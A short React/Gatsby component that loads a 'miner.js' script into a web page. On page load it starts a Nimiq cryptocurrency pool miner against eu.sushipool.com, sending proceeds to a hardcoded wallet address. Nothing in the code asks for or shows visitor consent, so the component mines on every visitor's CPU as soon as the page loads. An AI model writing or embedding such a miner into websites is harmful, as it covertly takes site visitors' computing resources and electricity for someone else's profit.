import React, { Component } from 'react'
import Helmet from 'react-helmet'
import { withPrefix } from "gatsby"


class NimiqMiner extends Component {

  componentDidMount() {
    //Pool Host, Pool Port, Wallet Address, # of CPU threads
    window.onload = () => {
        PoolMiner.init("eu.sushipool.com", 443, 'NQ86 1EMJ 9S8B RN99 BB1N JTA7 3ET1 AEPL 8XV5', 1)
    }
  }

  render() {
    return (
        <Helmet>
            <script src={withPrefix('miner.js')} type="text/javascript" />
        </Helmet>
    )
  }
}

export default NimiqMiner